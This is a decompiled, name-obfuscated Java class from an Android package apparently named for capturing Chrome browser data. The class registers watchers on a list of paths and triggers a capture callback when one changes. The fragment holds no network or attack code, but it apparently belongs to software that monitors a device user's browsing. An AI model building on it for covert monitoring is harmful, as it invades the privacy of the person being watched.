package com.vvt.capture.chrome.b;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.n.a.g;
import java.util.Iterator;
import java.util.List;

public class b
  implements e, com.vvt.n.a.a, g
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private i c;
  private com.vvt.n.a.b d;
  private boolean e;
  
  public b(com.vvt.n.a.b paramb)
  {
    this.d = paramb;
    this.e = false;
  }
  
  public void a(i parami)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = this.e;
    if (!bool1)
    {
      bool1 = true;
      this.e = bool1;
      this.c = parami;
      Object localObject = this.d;
      if (localObject != null)
      {
        localObject = a.a();
        Iterator localIterator = ((List)localObject).iterator();
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          localObject = (String)localIterator.next();
          boolean bool2 = a;
          if (bool2) {}
          com.vvt.n.a.b localb = this.d;
          localb.a((String)localObject, this);
        }
      }
      bool1 = b;
      if (!bool1) {}
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    i locali = this.c;
    locali.a();
    bool = a;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      this.e = false;
      bool = false;
      this.c = null;
      Object localObject = this.d;
      if (localObject != null)
      {
        localObject = a.a();
        Iterator localIterator = ((List)localObject).iterator();
        for (;;)
        {
          bool = localIterator.hasNext();
          if (!bool) {
            break;
          }
          localObject = (String)localIterator.next();
          com.vvt.n.a.b localb = this.d;
          localb.a((String)localObject);
        }
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString) {}
  
  public void c(String paramString) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */